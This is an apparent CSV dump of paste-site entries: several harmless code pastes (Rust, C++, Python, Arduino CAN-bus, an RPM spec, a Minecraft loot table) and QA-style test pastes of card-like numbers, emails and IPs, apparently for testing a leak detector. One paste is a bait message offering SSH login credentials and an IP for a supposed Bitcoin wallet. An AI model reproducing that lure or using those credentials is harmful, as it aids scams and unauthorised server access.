id,title,username,language,date,content
7AD7uUYp,Kirchhoff BigDecimal for bka,BamgoeSN,Rust,Monday 3rd of July 2023 06:59:23 AM CDT,"#![no_main]

use std::str::FromStr;
#[allow(unused)]
use std::{cmp::*, collections::*, fmt::*, io::*, iter, mem::*, num::*, ops::*};

use bigdecimal::BigDecimal;

fn solve<'t, It: Iterator<Item = &'t str>>(sc: &mut fastio::Tokenizer<It>) {
    let [n, m]: [usize; 2] = sc.next();
    let edges: Vec<(usize, usize, u64)> = (0..m)
        .map(|_| {
            let [u, v] = sc.next_map(|x: usize| x - 1);
            let w: u64 = sc.next();
            (u, v, w)
        })
        .collect();

    let eps = BigDecimal::from_str(""1e-20"")
        .unwrap()
        .with_prec(solver::PREC);
    let ans = solver::conj_grad(n, &edges, &eps);
    println!(""{}"", 1. / ans);
}

#[allow(unused)]
mod solver {
    pub const PREC: u64 = 100;
    use std::assert_eq;

    use bigdecimal::BigDecimal;
    use itertools::Itertools;

    pub fn conj_grad(n: usize, edges: &[(usize, usize, u64)], eps: &BigDecimal) -> BigDecimal {
        let conv_edges: Vec<(usize, usize, BigDecimal)> = edges
            .iter()
            .map(|&(u, v, w)| (u, v, BigDecimal::from(w).with_prec(PREC)))
            .collect();
        let (n, edges) = proc_input(n, &conv_edges);
        let dv = process(n, edges.as_slice(), eps);
        dv
    }

    fn proc_input(
        n: usize,
        edges: &[(usize, usize, BigDecimal)],
    ) -> (usize, Vec<(usize, usize, BigDecimal)>) {
        let mut uf = UnionFind::new(n);
        for &(u, v, _) in edges.iter() {
            uf.union(u, v);
        }
        let withzero: Vec<usize> = (0..n)
            .filter(|&i| uf.find_root(0) == uf.find_root(i))
            .collect();
        let zerotable: Vec<Option<usize>> = {
            let mut table = vec![None; n];
            for (i, &v) in withzero.iter().enumerate() {
                table[v] = Some(i);
            }
            table
        };
        let usededges: Vec<(usize, usize, BigDecimal)> = edges
            .iter()
            .filter_map(|e| {
                if let (Some(i), Some(j)) = (zerotable[e.0], zerotable[e.1]) {
                    Some((i, j, e.2.clone()))
                } else {
                    None
                }
            })
            .collect();
        let n = withzero.len();

        (n, usededges)
    }

    fn process(n: usize, edges: &[(usize, usize, BigDecimal)], eps: &BigDecimal) -> BigDecimal {
        let diag: Vec<BigDecimal> = {
            let mut ret = vec![BigDecimal::from(0).with_prec(PREC); n];
            for e in edges.iter() {
                ret[e.0] -= &e.2;
                ret[e.1] -= &e.2;
            }
            ret
        };

        let b: Vec<BigDecimal> = {
            let mut b = vec![BigDecimal::from(0).with_prec(PREC); n];
            (b[0], b[n - 1]) = (
                BigDecimal::from(1).with_prec(PREC),
                BigDecimal::from(-1).with_prec(PREC),
            );
            b
        };

        let get_ap = |p: &[BigDecimal]| {
            let mut ret = vec![BigDecimal::from(0).with_prec(PREC); n];
            for (i, x) in diag.iter().enumerate() {
                ret[i] += x * &p[i];
            }
            for e in edges.iter() {
                ret[e.0] += &e.2 * &p[e.1];
                ret[e.1] += &e.2 * &p[e.0];
            }
            let pavg: BigDecimal = p.iter().sum::<BigDecimal>() / BigDecimal::from(n as i64);
            for x in ret.iter_mut() {
                *x += &pavg
            }
            ret
        };

        let mut x = vec![BigDecimal::from(0).with_prec(PREC); n];
        let mut r = b;
        let mut p = r.clone();
        let mut rq: BigDecimal = r.iter().map(|r| r * r).sum();
        loop {
            x.iter_mut().for_each(|ele| *ele = ele.with_prec(PREC));
            r.iter_mut().for_each(|ele| *ele = ele.with_prec(PREC));
            p.iter_mut().for_each(|ele| *ele = ele.with_prec(PREC));
            if &rq.abs() <= eps {
                break;
            }
            let ap = get_ap(&p);
            let pap: BigDecimal = p.iter().zip(ap.iter()).map(|(p, sv)| p * sv).sum();
            let alpha = r.iter().map(|x| x * x).sum::<BigDecimal>() / pap;
            x.iter_mut()
                .zip(p.iter())
                .for_each(|(x, p)| *x += &alpha * p);
            let s: Vec<BigDecimal> = r
                .iter()
                .zip(ap.iter())
                .map(|(r, sv)| r - &alpha * sv)
                .collect();
            let sq: BigDecimal = s.iter().map(|s| s * s).sum();
            let c = &sq / rq;
            p = s.iter().zip(p.iter()).map(|(s, p)| s + &c * p).collect();
            r = s;
            rq = sq;
        }

        &x[n - 1] - &x[0]
    }

    struct UnionFind {
        size: usize,
        parents: Vec<usize>,
        group_size: Vec<usize>,
        group_num: usize,
    }

    impl UnionFind {
        /// Returns a new UnionFind instance where `size` number of elements are in their own disjoint set.
        fn new(size: usize) -> Self {
            Self {
                size,
                parents: vec![size; size],
                group_size: vec![1; size],
                group_num: size,
            }
        }

        fn find_root(&mut self, x: usize) -> usize {
            if self.parents[x] == self.size {
                return x;
            }
            let root = self.find_root(self.parents[x]);
            self.parents[x] = root;
            root
        }

        /// Add an edge between a and b.
        fn union(&mut self, a: usize, b: usize) {
            let a_root = self.find_root(a);
            let b_root = self.find_root(b);

            if a_root != b_root {
                self.group_num -= 1;
                let a_size = self.group_size[a_root];
                let b_size = self.group_size[b_root];
                if a_size < b_size {
                    self.parents[a_root] = b_root;
                    self.group_size[b_root] += a_size;
                } else {
                    self.parents[b_root] = a_root;
                    self.group_size[a_root] += b_size;
                }
            }
        }
    }
}

#[allow(unused)]
mod fastio {
    use super::ioutil::*;

    pub struct Tokenizer<It> {
        it: It,
    }

    impl<'i, 's: 'i, It> Tokenizer<It> {
        pub fn new(text: &'s str, split: impl FnOnce(&'i str) -> It) -> Self {
            Self { it: split(text) }
        }
    }

    impl<'t, It: Iterator<Item = &'t str>> Tokenizer<It> {
        pub fn next_ok<T: IterParse<'t>>(&mut self) -> PRes<'t, T> {
            T::parse_from_iter(&mut self.it)
        }

        pub fn next<T: IterParse<'t>>(&mut self) -> T {
            self.next_ok().unwrap()
        }

        pub fn next_map<T: IterParse<'t>, U, const N: usize>(
            &mut self,
            f: impl FnMut(T) -> U,
        ) -> [U; N] {
            let x: [T; N] = self.next();
            x.map(f)
        }

        pub fn next_it<T: IterParse<'t>>(&mut self) -> impl Iterator<Item = T> + '_ {
            std::iter::repeat_with(move || self.next_ok().ok()).map_while(|x| x)
        }
    }
}

mod ioutil {
    use std::{fmt::*, num::*};

    pub enum InputError<'t> {
        InputExhaust,
        ParseError(&'t str),
    }
    use InputError::*;

    pub type PRes<'t, T> = std::result::Result<T, InputError<'t>>;

    impl<'t> Debug for InputError<'t> {
        fn fmt(&self, f: &mut Formatter<'_>) -> Result {
            match self {
                InputExhaust => f.debug_struct(""InputExhaust"").finish(),
                ParseError(s) => f.debug_struct(""ParseError"").field(""str"", s).finish(),
            }
        }
    }

    pub trait Atom<'t>: Sized {
        fn parse(text: &'t str) -> PRes<'t, Self>;
    }

    impl<'t> Atom<'t> for &'t str {
        fn parse(text: &'t str) -> PRes<'t, Self> {
            Ok(text)
        }
    }

    impl<'t> Atom<'t> for &'t [u8] {
        fn parse(text: &'t str) -> PRes<'t, Self> {
            Ok(text.as_bytes())
        }
    }

    macro_rules! impl_atom {
        ($($t:ty) *) => { $(impl Atom<'_> for $t { fn parse(text: &str) -> PRes<Self> { text.parse().map_err(|_| ParseError(text)) } })* };
    }
    impl_atom!(u8 u16 u32 u64 u128 usize i8 i16 i32 i64 i128 isize f32 f64 bool char String NonZeroI8 NonZeroI16 NonZeroI32 NonZeroI64 NonZeroI128 NonZeroIsize NonZeroU8 NonZeroU16 NonZeroU32 NonZeroU64 NonZeroU128 NonZeroUsize);

    pub trait IterParse<'t>: Sized {
        fn parse_from_iter<'s, It: Iterator<Item = &'t str>>(it: &'s mut It) -> PRes<'t, Self>
        where
            't: 's;
    }

    impl<'t, A: Atom<'t>> IterParse<'t> for A {
        fn parse_from_iter<'s, It: Iterator<Item = &'t str>>(it: &'s mut It) -> PRes<'t, Self>
        where
            't: 's,
        {
            it.next().map_or(Err(InputExhaust), <Self as Atom>::parse)
        }
    }

    impl<'t, A: IterParse<'t>, const N: usize> IterParse<'t> for [A; N] {
        fn parse_from_iter<'s, It: Iterator<Item = &'t str>>(it: &'s mut It) -> PRes<'t, Self>
        where
            't: 's,
        {
            use std::mem::*;
            let mut x: [MaybeUninit<A>; N] = unsafe { MaybeUninit::uninit().assume_init() };
            for p in x.iter_mut() {
                *p = MaybeUninit::new(A::parse_from_iter(it)?);
            }
            Ok(unsafe { transmute_copy(&x) })
        }
    }

    macro_rules! impl_tuple {
        ($u:ident) => {};
        ($u:ident $($t:ident)+) => { impl<'t, $u: IterParse<'t>, $($t: IterParse<'t>),+> IterParse<'t> for ($u, $($t),+) { fn parse_from_iter<'s, It: Iterator<Item = &'t str>>(_it: &'s mut It) -> PRes<'t, Self> where 't: 's { Ok(($u::parse_from_iter(_it)?, $($t::parse_from_iter(_it)?),+)) } } impl_tuple!($($t) +); };
    }

    impl_tuple!(Q W E R T Y U I O P A S D F G H J K L Z X C V B N M);
}

fn get_input() -> &'static str {
    let mut buf = String::new();
    stdin().read_to_string(&mut buf).unwrap();
    Box::leak(buf.into_boxed_str())
}

#[no_mangle]
unsafe fn main() -> i32 {
    use std::io::*;
    let mut sc = fastio::Tokenizer::new(get_input(), |s| s.split_ascii_whitespace());
    let stdout = stdout();
    WRITER = Some(BufWriter::new(stdout.lock()));
    solve(&mut sc);
    WRITER.as_mut().unwrap_unchecked().flush().ok();
    0
}

static mut WRITER: Option<BufWriter<StdoutLock>> = None;
#[macro_export]
macro_rules! print {
    ($($t:tt)*) => {{ use std::io::*; write!(unsafe{ WRITER.as_mut().unwrap_unchecked() }, $($t)*).unwrap(); }};
}
#[macro_export]
macro_rules! println {
    ($($t:tt)*) => {{ use std::io::*; writeln!(unsafe{ WRITER.as_mut().unwrap_unchecked() }, $($t)*).unwrap(); }};
}

"
tLiqkxke,Word Ladder 2,Singasking,C++,Monday 3rd of July 2023 06:53:25 AM CDT,"class Solution {
public:
    vector<vector<string>> findLadders(string beginWord, string endWord, vector<string>& wordList) {
           unordered_map<string,int> map;
        for(auto x:wordList) map[x]=0;

        queue<vector<string>> q;
        vector<vector<string>> ans;
        
        q.push({beginWord});
        map[beginWord]=1;
        //1 means visited
        while(!q.empty()) {
            auto temp  = q.front();
            q.pop();
            string word = temp.back();
            
            if(word==endWord) {
                map[word]=0;
                ans.push_back(temp);
          
                continue;
            }
            for(int i=0;i<word.length();i++) {
                char x = word[i];
                for(int c='a';c<='z';c++) {
                 
                   word[i]=c;
                 
                    if (map.find(word)!=map.end() && map.find(word)->second!=1) {
                        map[word]=1;
                        vector<string> list = temp;
                        list.push_back(word);
                        q.push({list});
                    }

                }
                word[i]=x;
            }

            map[word]=0;
        }
        return ans;
    }
};"
7jPJPLVF,my_file,medical-boy-sf,JSON,Monday 3rd of July 2023 06:22:32 AM CDT,"{
  ""type"": ""minecraft:chest"",
  ""pools"": [
    {
      ""rolls"": {
        ""min"": 0,
        ""max"": 2
      },
      ""entries"": [
        {
          ""type"": ""item"",
          ""name"": ""emerald"",
          ""weight"": 4,
          ""functions"": [
            {
              ""function"": ""set_count"",
              ""count"": {
                ""min"": 1,
                ""max"": 3
              }
            }
          ]
        },
        {
          ""type"": ""item"",
          ""name"": ""diamond"",
          ""weight"": 2,
          ""functions"": [
            {
              ""function"": ""set_count"",
              ""count"": {
                ""min"": 1,
                ""max"": 2
              }
            }
          ]
        },
        {
          ""type"": ""item"",
          ""name"": ""book"",
          ""weight"": 4,
          ""functions"": [
            {
              ""function"": ""enchant_randomly""
            },
            {
              ""function"": ""set_count"",
              ""count"": 1
            }
          ]
        },
        {
          ""type"": ""item"",
          ""name"": ""iron_chestplate"",
          ""weight"": 2,
          ""functions"": [
            {
              ""function"": ""enchant_randomly""
            }
          ]
        },
        {
          ""type"": ""item"",
          ""name"": ""golden_apple"",
          ""weight"": 3,
          ""functions"": [
            {
              ""function"": ""set_count"",
              ""count"": 1
            }
          ]
        },
        {
          ""type"": ""item"",
          ""name"": ""guardian_spawn_egg"",
          ""weight"": 2,
          ""functions"": [
            {
              ""function"": ""set_count"",
              ""count"": 1
            }
          ]
        },
        {
          ""type"": ""item"",
          ""name"": ""iron_leggings"",
          ""weight"": 2,
          ""functions"": [
            {
              ""function"": ""enchant_randomly""
            }
          ]
        },
        {
          ""type"": ""item"",
          ""name"": ""iron_helmet"",
          ""weight"": 2,
          ""functions"": [
            {
              ""function"": ""enchant_randomly""
            }
          ]
        },
        {
          ""type"": ""item"",
          ""name"": ""iron_boots"",
          ""weight"": 2,
          ""functions"": [
            {
              ""function"": ""enchant_randomly""
            }
          ]
        },
        {
          ""type"": ""item"",
          ""name"": ""iron_sword"",
          ""weight"": 2,
          ""functions"": [
            {
              ""function"": ""enchant_randomly""
            }
          ]
        },
        {
          ""type"": ""item"",
          ""name"": ""iron_golem_spawn_egg"",
          ""weight"": 2,
          ""functions"": [
            {
              ""function"": ""enchant_randomly""
            }
          ]
        }
      ]
    },
    {
      ""rolls"": {
        ""min"": 5,
        ""max"": 8
      },
      ""entries"": [
        {
          ""type"": ""item"",
          ""name"": ""gunpowder"",
          ""weight"": 5,
          ""functions"": [
            {
              ""function"": ""set_count"",
              ""count"": {
                ""min"": 2,
                ""max"": 5
              }
            }
          ]
        },
        {
          ""type"": ""item"",
          ""name"": ""pumpkin_pie"",
          ""weight"": 10,
          ""functions"": [
            {
              ""function"": ""set_count"",
              ""count"": {
                ""min"": 1,
                ""max"": 3
              }
            }
          ]
        },
        {
          ""type"": ""item"",
          ""name"": ""bone_block"",
          ""weight"": 7,
          ""functions"": [
            {
              ""function"": ""set_count"",
              ""count"": {
                ""min"": 1,
                ""max"": 3
              }
            }
          ]
        },
        {
          ""type"": ""item"",
          ""name"": ""wheat_seeds"",
          ""weight"": 5,
          ""functions"": [
            {
              ""function"": ""set_count"",
              ""count"": {
                ""min"": 2,
                ""max"": 5
              }
            }
          ]
        },
        {
          ""type"": ""item"",
          ""name"": ""pumpkin_seeds"",
          ""weight"": 5,
          ""functions"": [
            {
              ""function"": ""set_count"",
              ""count"": {
                ""min"": 2,
                ""max"": 5
              }
            }
          ]
        },
        {
          ""type"": ""item"",
          ""name"": ""melon_seeds"",
          ""weight"": 5,
          ""functions"": [
            {
              ""function"": ""set_count"",
              ""count"": {
                ""min"": 2,
                ""max"": 5
              }
            }
          ]
        },
        {
          ""type"": ""item"",
          ""name"": ""rotten_flesh"",
          ""weight"": 10,
          ""functions"": [
            {
              ""function"": ""set_count"",
              ""count"": {
                ""min"": 1,
                ""max"": 7
              }
            }
          ]
        }
      ]
    }
  ]
}"
65CcbAHA,A*,KirillSamokhin,Python,Monday 3rd of July 2023 06:14:59 AM CDT,"class Heap:
    def __init__(self, arr=None):
        ""Инициализация объекта класса""
        if arr is None:
            arr = []
        self.__heap = []
        for el in arr:
            self.put(el)

    def sift_up(self, index):
        ""Просеивает узел с индексом index вверх""
        if index < 0 or index >= len(self.__heap):
            return
        parent = (index - 1) // 2
        while index and not self.__heap[parent] < self.__heap[index]:
            self.__heap[parent], self.__heap[index] = self.__heap[index], self.__heap[parent]
            index, parent = parent, (index - 1) // 2

    def sift_down(self, index):
        ""Просеивает узел с индексом index вниз""
        if index < 0 or index >= len(self.__heap):
            return
        minIndex = index
        while True:
            left, right = 2*index + 1, 2*index + 2
            if right < len(self.__heap) and self.__heap[right] < self.__heap[minIndex]:
                minIndex = right
            if left < len(self.__heap) and self.__heap[left] < self.__heap[minIndex]:
                minIndex = left
            if minIndex == index:
                return
            else:
                self.__heap[index], self.__heap[minIndex] = self.__heap[minIndex], self.__heap[index]
                index = minIndex

    def extract_min(self):
        ""Метод достаёт минимальный элемент из кучи, меняет его местами с максимальным и потом удаляет""
        if not self.__heap:
            return
        min_element = self.__heap[0]
        self.__heap[0] = self.__heap[-1]
        del self.__heap[-1]
        self.sift_down(0)
        return min_element

    def put(self, element):
        ""метод добавляет в конец кучи новый элемент, после чего просеивает его вверх""
        self.__heap.append(element)
        self.sift_up(self.size() - 1)

    def size(self):
        ""Метод возвращает размер кучи""
        return len(self.__heap)
    
class Graph:
    def __init__(self, dictionary):
        self.graph = dictionary

    def heuristic(self, cur_vert, end_vert):
        return abs(ord(end_vert) - ord(cur_vert))

    def a_star(self, start, end):
        distances = dict({start: 0})
        roots = dict({start: None})
        queue = Heap([(0, start)])
        while queue.size() != 0:
            cur = queue.extract_min()[1]
            if cur == end:
                break
            if not self.graph[cur].keys():
                continue
            for node, val in self.graph[cur].items():
                temp_dist = distances[cur] + val
                if node not in distances or temp_dist < distances[node]:
                    roots[node] = cur
                    distances[node] = temp_dist
                    queue.put((temp_dist + self.heuristic(node, end), node))
        return roots

    def recover_path(self, map, end):
        path = ''
        current = end
        while current:  # пока существует вершина из которой пришли
            path += current  # к пути добавляем текущую
            current = map[current]  # берем вершину откуда пришли в текущую
        return path[::-1]  # переворачиваем путь


begin, destination = input().split(' ')
config = {}
while True:
    try:
        line = input()
    except EOFError:
        break
    if not line:
        break
    vert, dest, length = line.split(' ')
    length = float(length)
    if vert not in config.keys():
        config[vert] = {}
    config[vert][dest] = length
    config[vert] = dict(sorted(config[vert].items()))
    if dest not in config.keys():
        config[dest] = {}
ex = Graph(config)
lst = ex.a_star(begin, destination)
result = ex.recover_path(lst, destination)
print(result)"
21n4C6LA,BTC Wallet Credentials have been reset,placeheart_58,GetText,Monday 3rd of July 2023 06:10:06 AM CDT,"Dear User
We have received a request to reset the login information for your Bitcoin wallet. If you did not make this request, please disregard this message.
Your new login credentials are cecilokurah8:fpExXR on 45.9.148.244
You can connect via SSH.
Regards"
CvdkVgXm,data622,TestGuy1,JSON,Monday 3rd of July 2023 06:00:05 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '35bc0653a51b87f26fba7f3b5932f63bd03b3b71a047989a508eec1eea8b59ee29417fa3001bef4df5a7c53af1da041aff871e4f869843ed43cfd6da2358e579220671ad3ed06e7c8e8df3df10f3893dff34386af7ae7e8d1d30bf6543cff595a645e0ded125a30fc041ed020be757d7f3e3b87cfe729f5116936a8e111997ab',
  otherdata: [
    '423e47670c6c0588dd312491f9f5fa2a',
    '061ee7e9ba50ee254f18c3f2068912c4',
    '2f6aa2a550fe3c347d76ce3d3872df7f',
    '3f2d70c0a8b7d269b32f53ee8b2fc0b3',
    'b931fbd5eb4d4f8cc32e856133ddb75a',
    '6c6a405f9622af9f1637e3ad35efcde1',
    'd6ee8d98cbe4904a1a02c84221304445',
    '267644af1eef1e85b654dd9d896de47b'
  ]
}"
we2UDgFe,Untitled,vladislav_larionov,RPM Spec,Monday 3rd of July 2023 05:57:14 AM CDT,"Summary: Extremely Fast Compression algorithm
Name: ru.auroraos.lz4
Version: 1.8.1.3
Release: 1%{?dist}
License: BSD-type license
Group: Libraries/Databases
URL: https://github.com/lz4/lz4

Source: %{name}-%{version}.tar.gz
BuildRoot: %{_tmppath}/%{name}-%{version}-%{release}-root

BuildRequires: gcc-c++
#Requires: pango

%description
LZ4 is lossless compression algorithm

PackageName: LZ4
Categories:
  - Library

%package devel
Summary: lz4 development headers and static library
Group: Development/Libraries
Requires: %{name} = %{version}

%description devel
LZ4 is lossless compression algorithm. This
package provides libraries and headers for development

PackageName: LZ4 Development
Categories:
  - Library

%package tools
Summary: lz4 tools
Group: Development/Libraries
Requires: %{name} = %{version}

%description tools
LZ4 is lossless compression algorithm. This
package provides tools

PackageName: LZ4 Tools
Type: console-application
Categories:
  - Utility

%prep
%setup -q -n %{name}-%{version}/lz4


%build
%{__make} clean || true

CFLAGS=""$CFLAGS -fPIC""
CXXFLAGS=""$CXXFLAGS -fPIC""

%{__make} prefix=/usr %{?_smp_mflags}  CC=gcc

%install
%{__rm} -rf %{buildroot}
%{__make} install prefix=%{_prefix} LIBDIR=%{_libdir} DESTDIR=%{buildroot}

desktop-file-install \
  --dir %{buildroot}%{_datadir}/applications \
   %{_sourcedir}/../lz4/ru.auroraos.lz4.desktop


%clean
%{__rm} -rf %{buildroot}

%pre

%post -n ru.auroraos.lz4 -p /sbin/ldconfig

%postun -n ru.auroraos.lz4 -p /sbin/ldconfig

%files

%defattr(644,root,root,0755)
# %exclude %{_defaultdocdir}/snappy
%{_libdir}/liblz4.so.*
%exclude %{_mandir}/man1/*lz4*

%{_datadir}/applications/%{name}.desktop


%files devel
%defattr(-, root, root, 0755)
%{_includedir}/lz4*.h
%{_libdir}/liblz4.a
%{_libdir}/liblz4.so
%{_libdir}/pkgconfig/liblz4.pc
%exclude %{_libdir}/libsnappy.la

%files tools
%defattr(-, root, root, 0755)
%{_bindir}/lz4*
%{_bindir}/unlz4

%changelog
* Thu Mar 29 2018 rinigus <rinigus.git@gmail.com> - 1.8.1.2
- initial packaging release for SFOS"
7heHn47E,Maduino Zero SAMD21G18A CAN-BUS Dev Board,microrobotics,Arduino,Monday 3rd of July 2023 04:35:29 AM CDT,"/*
You should type your messages as IDH,IDH,LEN,D0,D1,D2,D3,D4,D5,D6,D7\n, where:
IDH,IDL are the high and low parts of the CAN ID, in hexadecimal.
LEN is the data length (0 to 8).
D0 to D7 are the data bytes, in hexadecimal.
If you type 123,456,3,12,34,56, this will send a CAN message with ID 0x123456, length 3, and data bytes 0x12, 0x34, 0x56.

This code listens for user input. Once a newline is received, it parses the input and sends it as a CAN message. Note that this code does not handle errors in the input format, you should ensure you enter the data correctly.
*/

#include <mcp_can.h>
#include <SPI.h>

MCP_CAN CAN(10); // Set CS to pin 10
String inputString = """";

void setup() {
    Serial.begin(115200);

    while (CAN_OK != CAN.begin(CAN_500KBPS)) {            // init can bus : baudrate = 500k
        Serial.println(""CAN BUS Shield init fail"");
        Serial.println("" Init CAN BUS Shield again"");
        delay(100);
    }
    Serial.println(""CAN BUS Shield init ok!"");
}

void loop() {
    unsigned char len = 0;
    unsigned char buf[8];

    if (CAN_MSGAVAIL == CAN.checkReceive()) {            // check if data coming
        CAN.readMsgBuf(&len, buf);    // read data,  len: data length, buf: data buf

        unsigned long canId = CAN.getCanId();

        Serial.println(""-----------------------------"");
        Serial.println(""Get data from CAN BUS"");
        Serial.print(""CAN ID: "");
        Serial.println(canId, HEX); // Prints ID in HEX format

        Serial.print(""CAN Data: "");
        for(int i = 0; i<len; i++) {    // print the data
            Serial.print(buf[i], HEX); // Prints data bytes in HEX format
            Serial.print(""\t"");
        }
        Serial.println();
    }

    // check if there's any serial available
    while (Serial.available()) {
        char inChar = (char)Serial.read();
        inputString += inChar;

        // if received character is a newline, parse the command
        if (inChar == '\n') {
            parseCommand(inputString);
            inputString = """";
        }
    }
}

void parseCommand(String command) {
    // parse the command in the format: IDH,IDH,LEN,D0,D1,D2,D3,D4,D5,D6,D7
    int parts[11];
    int i = 0;

    int idx1 = 0;
    int idx2 = command.indexOf(',');
    while (idx2 != -1 && i < 11) {
        parts[i++] = strtol(command.substring(idx1, idx2).c_str(), NULL, 16);
        idx1 = idx2 + 1;
        idx2 = command.indexOf(',', idx1);
    }
    if (i < 11) {
        parts[i++] = strtol(command.substring(idx1).c_str(), NULL, 16);
    }

    // sanity check
    if (parts[2] > 8 || parts[2] < 0) {
        Serial.println(""Invalid length"");
        return;
    }

    // prepare id and data
    unsigned long canId = (parts[0] << 8) + parts[1];
    unsigned char len = parts[2];
    unsigned char data[8];
    for (int i = 0; i < len; i++) {
        data[i] = parts[3 + i];
    }

    // send the message
    CAN.sendMsgBuf(canId, 0, len, data);
    Serial.println(""Sent CAN message"");
}
"
WdxvsB9g,Advanced AND - Donald AND Duck AND Hello,wheresTheAnyKey,C,Monday 3rd of July 2023 04:15:56 AM CDT,"Pasted at: 03/07/2023 10:15
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3

DATA_ID_TESTDATATOFIND
hello, donald was a duck

5502491997132108

Fuzzy-Wuzzy	- DASH
Fuzzy;Wuzzy	- COLON
Fuzzy!Wuzzy	- EXCLAMATION
Fuzzy£Wuzzy	- POUND
Fuzzy#Wuzzy	- HASH
Fuzzy%Wuzzy	- PERCENT
Fuzzy@Wuzzy	- AT
Fuzzy&Wuzzy	- AND
Fuzzy=Wuzzy	- EQUAL
Fuzzy§Wuzzy
Fuzzy~Wuzzy
Fuzzy?Wuzzy	 - QUESTION MARK
Fuzzy$Wuzzy	 - DOLLAR
Fuzzy[Wuzzy] - BRACKETS
Fuzzy^Wuzzy
Fuzzy(Wuzzy) - BRACKETS
Fuzzy+Wuzzy	 - PLUS
Fuzzy±Wuzzy	 - PLUS/MINUE
Fuzzy|Wuzzy	 - PIPE
Fuzzy/Wuzzy	 - FORWARDSLASH
Fuzzy<Wuzzy> - BRACKETS
Fuzzy{Wuzzy} - CURLY
Fuzzy\Wuzzy  - BACKSLASH
"
wmke109u,Financial What's Inside - Email/IP/Bank,wheresTheAnyKey,C,Monday 3rd of July 2023 04:15:55 AM CDT,"Pasted at: 03/07/2023 10:15
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3
What's Inside Paste 

5378496492418234
5571598708435236
5587663820997281
5502491997132108
5516931903918995
5322909948799236
5443317136071703
5409137465238695
5497550044220575
5559606180091553

aaribaud@att.net
aaribaud@comcast.net
aaribaud@att.com
aaribaud@att.co.uk
aaribaud@yahoo.com

246.107.72.199
221.187.199.189
3.109.3.44
109.112.85.139
250.83.213.179
169.141.201.234
50.180.50.59
20.181.54.231
64.235.191.167
48.103.36.43"
zMx4j8sr,Financial with SPECIAL CHARACTERS,wheresTheAnyKey,C,Monday 3rd of July 2023 04:15:53 AM CDT,"Pasted at: 03/07/2023 10:15
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3

DATA_ID_TESTDATATOFIND

5148-2121-6312-7114   - DASHES
5148212163127114
5107-4578-0576-9075   - DASHES
5107457805769075
3488-1760-1454-729   - DASHES
348817601454729

Fuzzy-Wuzzy	- DASH
Fuzzy;Wuzzy	- COLON
Fuzzy!Wuzzy	- EXCLAMATION
Fuzzy£Wuzzy	- POUND
Fuzzy#Wuzzy	- HASH
Fuzzy%Wuzzy	- PERCENT
Fuzzy@Wuzzy	- AT
Fuzzy&Wuzzy	- AND
Fuzzy=Wuzzy	- EQUAL
Fuzzy§Wuzzy
Fuzzy~Wuzzy
Fuzzy?Wuzzy	 - QUESTION MARK
Fuzzy$Wuzzy	 - DOLLAR
Fuzzy[Wuzzy] - BRACKETS
Fuzzy^Wuzzy
Fuzzy(Wuzzy) - BRACKETS
Fuzzy+Wuzzy	 - PLUS
Fuzzy±Wuzzy	 - PLUS/MINUE
Fuzzy|Wuzzy	 - PIPE
Fuzzy/Wuzzy	 - FORWARDSLASH
Fuzzy<Wuzzy> - BRACKETS
Fuzzy{Wuzzy} - CURLY
Fuzzy\Wuzzy  - BACKSLASH"
rAFuK6pi,Domains with SPECIAL CHARS,wheresTheAnyKey,C,Monday 3rd of July 2023 04:15:51 AM CDT,"Pasted at: 03/07/2023 10:15
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3

DATA_ID_TESTDATATOFIND

www.qatesting.com
blog.qatesting.com
www.qatesting.com/index.html
www.qatesting.com/home
www.qatestingblog.com
www.qatestingtutorials.com
shop.qatesting.co.uk
admin.qatesting.io 
qatesting
qatesting.co.uk
qatesting.cn
qatesting.io
findmetesting.com
www.qatesting-blog.com
www.qatesting-blog23.com
www.qatesting
www.qatesting.co.uk
www.qatesting.cn
www.qatesting.io
www.findmetesting.com
www.wobsut.gov

The difference is that QA is process oriented and QC is product oriented.

Testing, therefore is product oriented and thus is in the QC domain. Testing for quality isn't assuring quality, it's controlling it.



Fuzzy-Wuzzy	- DASH
Fuzzy;Wuzzy	- COLON
Fuzzy!Wuzzy	- EXCLAMATION
Fuzzy£Wuzzy	- POUND
Fuzzy#Wuzzy	- HASH
Fuzzy%Wuzzy	- PERCENT
Fuzzy@Wuzzy	- AT
Fuzzy&Wuzzy	- AND
Fuzzy=Wuzzy	- EQUAL
Fuzzy§Wuzzy
Fuzzy~Wuzzy
Fuzzy?Wuzzy	 - QUESTION MARK
Fuzzy$Wuzzy	 - DOLLAR
Fuzzy[Wuzzy] - BRACKETS
Fuzzy^Wuzzy
Fuzzy(Wuzzy) - BRACKETS
Fuzzy+Wuzzy	 - PLUS
Fuzzy±Wuzzy	 - PLUS/MINUE
Fuzzy|Wuzzy	 - PIPE
Fuzzy/Wuzzy	 - FORWARDSLASH
Fuzzy<Wuzzy> - BRACKETS
Fuzzy{Wuzzy} - CURLY
Fuzzy\Wuzzy  - BACKSLASH
"
vhQ8nXTU,ALL Keywords with Excluded Words,wheresTheAnyKey,C,Monday 3rd of July 2023 04:15:50 AM CDT,"Pasted at: 03/07/2023 10:15
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3

DATA_ID_TESTDATATOFIND 

The dystopian version of superintelligence is illustrated with frequency by leaders in the technology industry, and is famously depicted by Hollywood in films like Terminator, 
or more recently Ex Machina, and even the Avengers. The “furious deity A.I.” is a story you know, because it is the story you are constantly told: we build the thinking machine, 
it surpasses our abilities in every way, and it destroys us for one of any number of reasons.Maybe it perceives us as a threat. Maybe we’re just in its way, 
and it hardly perceives us at all — mankind, a disposable insect race.

There are of course many arguments in opposition to the now ubiquitous concept of our apocalypse by artificial intelligence. 
I myself have called into question the logic of such dystopian arguments in Anatomy of Next. But our subject here is less pertaining to the nature of the conscious machine than 
it is to the way we talk about this subject, and what it means. First, consider that most of the artificial intelligence depicted in culture looks human, a representation with 
no basis in technological reality. Then, the true scope of the Singularity is almost impossible to predict, which begs a question: where are these opinions about the broadly 
unknowable coming from?"
yNDkJpps,All Keywords with ANY Additional Words,wheresTheAnyKey,C,Monday 3rd of July 2023 04:15:48 AM CDT,"Pasted at: 03/07/2023 10:15
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3

DATA_ID_TESTDATATOFIND KEYWAUTO

